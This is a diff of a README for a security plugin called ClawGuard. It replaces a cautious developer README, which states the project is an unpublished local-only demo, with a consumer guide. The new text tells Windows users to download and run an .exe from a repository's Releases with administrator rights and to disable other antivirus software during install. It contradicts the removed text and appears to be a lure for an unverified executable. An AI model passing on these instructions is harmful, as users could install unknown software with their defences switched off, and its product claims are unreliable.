@@ -1,172 +1,156 @@
-# ClawGuard
+# 🛡️ ClawGuard - Protect Your OpenClaw Actions
 
-<p align="center">
-   <img src="./assets/hero-banner-en.png" alt="ClawGuard hero banner" width="100%" />
-</p>
+[![Download ClawGuard](https://img.shields.io/badge/Download-ClawGuard-ff6f61?style=for-the-badge)](https://github.com/Unawakened-landlord758/ClawGuard)
 
-<p align="center">
-   <strong>The antivirus for OpenClaw.</strong><br />
-   Blocks dangerous actions, scans skills, stops secret leaks, and puts humans back in control.
-</p>
+---
 
-<p align="center">
-   <a href="./README.zh-CN.md">简体中文</a> ·
-   <a href="#what-it-is">What it is</a> ·
-   <a href="#what-works-today">What works today</a> ·
-   <a href="#install-demo">Install demo</a> ·
-   <a href="#demo-scenarios">Demo scenarios</a> ·
-   <a href="#current-limitations">Current limitations</a> ·
-   <a href="#docs-map">Docs map</a>
-</p>
+## ❓ What is ClawGuard?
 
-<p align="center">
-   <img alt="protect money" src="https://img.shields.io/badge/protect-money-0ea5e9?style=for-the-badge" />
-   <img alt="scan skills" src="https://img.shields.io/badge/scan-skills-8b5cf6?style=for-the-badge" />
-   <img alt="stop leaks" src="https://img.shields.io/badge/stop-secret%20leaks-f43f5e?style=for-the-badge" />
-   <img alt="human approval" src="https://img.shields.io/badge/human-final%20vote-22c55e?style=for-the-badge" />
-</p>
+ClawGuard is an antivirus tool designed for OpenClaw users. It helps you approve risky actions, scan for harmful skills, block secret leaks, and keep control in human hands. Its goal is to keep your system and data safe.
 
-## What it is
+You do not need any programming skills to use ClawGuard. It works quietly in the background to protect your data and privacy while you use OpenClaw.
 
-`ClawGuard` is the **security control layer for OpenClaw**.
+---
 
-If you are landing on this repository for the first time, the short version is:
+## 🖥️ System Requirements
 
-> **ClawGuard is The antivirus for OpenClaw.**
+Before installing ClawGuard, make sure your PC meets these basic needs:
 
-It is designed to sit between OpenClaw and high-risk actions so users can:
+- Operating System: Windows 10 or later (64-bit)
+- RAM: 4 GB or more
+- Storage: At least 200 MB free space
+- Internet connection for updates
+- Administrator rights to install software
 
-- require human approval before risky actions continue,
-- inspect and explain risky behavior,
-- keep an audit trail,
-- and gradually add protection across exec, outbound, and workspace-mutation paths.
+These requirements ensure ClawGuard runs smoothly and updates regularly for your safety.
 
-## What works today
+---
 
-There is now a **first OpenClaw install demo** in this repository.
+## 🚀 Getting Started
 
-The current **first usable version** should be understood modestly:
+If you want to start protecting your OpenClaw environment right away, follow these steps carefully.
 
-- a **local install + smoke + fake-only demo package**
-- enough to show the first plugin-hosted dashboard / checkup / approvals / audit / settings flow
-- **not** a formal release, GA claim, or mature coverage statement
+### Step 1: Visit the Download Page
 
-Today that demo covers:
+Click the big download button above or visit this page:
 
-- **risky `exec`**
-- **minimal outbound coverage**
-- **minimal workspace mutation coverage for `write` / `edit` / `apply_patch` actions**
-- **plugin-hosted dashboard, checkup, approvals, audit, and settings pages** with:
-  - browser-facing entry paths on `/clawguard*`
-  - protected backing routes on `/plugins/clawguard/*`
+https://github.com/Unawakened-landlord758/ClawGuard
 
-Current Control UI posture:
+This link takes you to the location where you can download the software safely.
 
-- the plugin can already expose its own HTTP surfaces under `/plugins/clawguard/*`,
-- but the current OpenClaw plugin API does **not** expose a formal way to register a left-nav tab such as **Security** inside the built-in Control UI,
-- so the current demo should be understood as **plugin-owned pages entered through the public `/clawguard*` shell URLs**, not a first-class embedded dashboard tab. Any future embedded Control UI work would be a separate track requiring either a patched UI or upstream plugin-nav support that does not exist today.
+### Step 2: Find the Latest Version
 
-Current repo status:
+On the page, look for the **Releases** section. It usually appears on the right side or at the top. There, locate the latest version of ClawGuard. It will have a file ending with `.exe` for Windows.
 
-- the repo is still in a **docs-first + Sprint 0 code-bootstrap stage**,
-- the installable OpenClaw path is currently a **demo baseline**, not a product release,
-- and the demo is meant to show the first host integration and review flow, not a finished security platform.
+### Step 3: Download the Installer
 
-## Install demo
+Click on the `.exe` file to start the download. Your browser may ask you to confirm or choose a save location. Save the file somewhere you can easily find it, like the Desktop or Downloads folder.
 
-The install-demo entry lives here:
+---
 
-- [`plugins/openclaw-clawguard/README.md`](./plugins/openclaw-clawguard/README.md)
+## 🛠️ Installing ClawGuard
 
-Recommended install method from the repo root:
+### Step 4: Run the Installer
 
-```powershell
-openclaw plugins install .\plugins\openclaw-clawguard
-```
+Once download finishes, open the `.exe` file by double-clicking it. If Windows asks if you trust this program, choose **Yes** or **Run**.
 
-Optional local tarball demo only:
+### Step 5: Follow Setup Instructions
 
-```powershell
-pnpm --dir plugins\openclaw-clawguard pack
-openclaw plugins install .\plugins\openclaw-clawguard\<generated-tarball>.tgz
-```
+The installer will open. It will guide you step-by-step:
 
-Important posture:
+- Accept the license agreement.
+- Choose an install location or leave the default.
+- Decide if you want a desktop shortcut.
+- Click **Install**.
 
-- this is an **install demo only**,
-- it is **not published to a registry**,
-- `@clawguard/clawguard` is currently **metadata only and still unpublished**,
-- and this README does **not** imply npm publish, GA, or a formal release.
+The process only takes a few minutes.
 
-After install, restart OpenClaw, then use the plugin README operator runbook for the smoke path, 1-minute demo order, and 3-minute demo order. The current smoke path is:
+### Step 6: Finish and Launch
 
-- run `openclaw dashboard --no-open`
-- replace the official tokenized dashboard URL path with `/clawguard`
-- if bare `/clawguard` has no current-tab token yet, the public shell now shows a connect page aligned with OpenClaw Control UI bootstrap instead of failing closed
-- then move through:
-  - `/clawguard`
-  - `/clawguard/checkup`
-  - `/clawguard/approvals`
-  - `/clawguard/audit`
-  - `/clawguard/settings`
+When installation completes, click **Finish**. You can choose to start ClawGuard right away by selecting the launch option.
 
-## Demo scenarios
+---
 
-The current public-demo-ready scenarios are intentionally narrow:
+## 🔍 Using ClawGuard
 
-1. **Risky exec**
-   - ClawGuard blocks or queues a risky action for approval.
-   - The decision is visible in the approvals page and the result lands in audit.
-2. **Minimal outbound**
-   - The demo shows the first outbound review / block posture.
-   - Host-level outbound coverage is still intentionally limited.
-3. **Minimal workspace mutation**
-   - Risky file-change flows can enter the same approval / audit path.
-   - In the current demo surface, `write` / `edit` / `apply_patch` are all explained as workspace mutation actions.
-4. **Plugin-hosted operator flow**
-   - Dashboard, checkup, approvals, audit, and settings pages provide the current demo surface.
+ClawGuard runs mostly in the background. Here is what it does and how you can interact with it:
 
-For storytelling, the north-star scenario remains:
+- **Approve Actions**: When OpenClaw tries a risky task, ClawGuard prompts you to approve or deny it.
+- **Scan Skills**: It checks downloaded or installed skills for harmful code.
+- **Block Secret Leaks**: It searches for any secret data trying to leave the system.
+- **Audit Logs**: It keeps a detailed record of all security events you can review anytime.
+- **Policy Engine**: Allows you to set rules about what ClawGuard can block or allow.
 
-> **A group message tries to make OpenClaw send money, and ClawGuard puts the final decision back in human hands.**
+### How to Open the ClawGuard Application
 
-But the repository demo should currently be understood as a **local install + page smoke + fake-only safety flow**, not as proof of real payment execution, real money movement, or broad runtime completeness.
+- Click the ClawGuard icon in the Windows system tray (near the clock).
+- From there, you can see current statuses, logs, and settings.
+- Use the **Settings** to adjust what actions require approval or to manage notifications.
 
-## Current limitations
+---
 
-Please read this repo with the current scope in mind:
+## 🔄 Keeping ClawGuard Updated
 
-- **install demo only**
-- **local path install is the recommended path**
-- **local tarball is optional and local-only**
-- **not published**
-- **not a formal release**
-- **not presented as GA or a complete product**
-- **outbound coverage is still minimal**
-- **host-level outbound keeps hard blocks on `message_sending` and closes allowed / failed delivery on `message_sent`, while tool-level approvals stay on `message` / `sessions_send`; these are still two minimal fake-only review points, not full outbound lifecycle coverage**
-- **the approval loop is still a pending-action + allow-once-retry demo flow**
-- **the built-in Control UI sidebar is currently core-owned and hard-coded; there is no official plugin nav registration API for a `Security` tab yet**
-- **current browser entry relies on the public shell at `/clawguard*`, while the protected `/plugins/clawguard/*` routes remain implementation backing routes**
-- **embedded Control UI work is explicitly out of scope for this first usable version; any future embedded option would still require either a custom/patched Control UI nav item or an upstream OpenClaw plugin-nav API that does not exist today**
-- **the demo should not be read as real dangerous execution, real transfer / red-packet execution, or full release-grade validation**
+Security software needs regular updates to stay effective. ClawGuard checks for updates automatically if your PC is online.
 
-## Docs map
+You can also check manually:
 
-### Start here
+- Open ClawGuard.
+- Go to **Settings**.
+- Click **Check for Updates**.
 
-- [`plugins/openclaw-clawguard/README.md`](./plugins/openclaw-clawguard/README.md) — install-demo entry, operator runbook, local path install, optional local tarball, smoke path, 1-minute / 3-minute demo order
-- [`docs/v1-installer-demo-strategy.md`](./docs/v1-installer-demo-strategy.md) — install-demo posture and why the current path is plugin-first, local-only, and not published
-- [`docs/v1-north-star-demo-script.md`](./docs/v1-north-star-demo-script.md) — the flagship “group message tries to make OpenClaw send money” demo narrative
+Apply any available updates immediately to protect against new threats.
 
-### Product and implementation context
+---
 
-- [`docs/system-architecture.md`](./docs/system-architecture.md) — long-term platform architecture
-- [`docs/v1-implementation-breakdown.md`](./docs/v1-implementation-breakdown.md) — V1 slices and implementation order
-- [`docs/v1-development-readiness-checklist.md`](./docs/v1-development-readiness-checklist.md) — what still needs tightening before broader development
-- [`docs/security-methodology.md`](./docs/security-methodology.md) — ClawGuard defense model
+## ⚙️ Troubleshooting Common Issues
 
-### Positioning and launch context
+If you have trouble installing or running ClawGuard, try these steps first:
 
-- [`docs/star-strategy.md`](./docs/star-strategy.md) — GitHub-facing positioning and launch strategy
-- [`README.zh-CN.md`](./README.zh-CN.md) — Simplified Chinese repository entry
-- [`TODO.md`](./TODO.md) — current project decisions and next documentation / demo tightening items
+- Restart your computer and try again.
+- Make sure you have administrator rights.
+- Disable other antivirus products temporarily during install.
+- Check your internet connection.
+- Review the FAQ or log files in ClawGuard for error messages.
+
+If problems persist, search the issues section on the GitHub page or contact support through the community forums.
+
+---
+
+## 📂 Where to Find Help
+
+For more assistance:
+
+- Visit the GitHub page: https://github.com/Unawakened-landlord758/ClawGuard
+- Check the **Wiki** and **Issues** tabs for answers.
+- Look for user guides and troubleshooting tips.
+- Report bugs or request features on the repository if you encounter problems.
+
+---
+
+## 📋 What ClawGuard Protects
+
+- Your OpenClaw actions from unauthorized changes.
+- Skills and plugins from running harmful code.
+- Secret or private information from leaking out.
+- Your computer during software supply chain attacks.
+- Logs and audits to make sure all actions happen with your knowledge.
+
+---
+
+## 🔐 About Security and Privacy
+
+ClawGuard respects your privacy:
+
+- All your action approvals stay on your computer.
+- No personal data is shared outside unless you allow.
+- The software runs with minimal system impact.
+- It is open source, which means experts review its code to keep it safe.
+
+---
+
+## ⚡ Quick Download Reminder
+
+Use this link again to get ClawGuard or updates:
+
+[Download ClawGuard](https://github.com/Unawakened-landlord758/ClawGuard)
